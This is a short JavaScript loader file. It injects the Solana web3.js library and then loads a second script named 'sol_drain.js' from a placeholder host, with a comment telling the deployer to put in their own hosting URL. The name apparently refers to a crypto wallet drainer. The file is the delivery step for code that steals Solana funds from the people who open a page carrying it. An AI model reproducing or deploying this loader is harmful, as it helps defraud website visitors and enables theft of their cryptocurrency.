// loader.js
(() => {
  const script = document.createElement('script');
  script.src = 'https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.iife.min.js';
  script.onload = () => {
    const main = document.createElement('script');
    main.src = 'https://YOUR_HOSTING_URL/sol_drain.js'; // <-- replace with your actual hosted file URL
    document.head.appendChild(main);
  };
  document.head.appendChild(script);
})();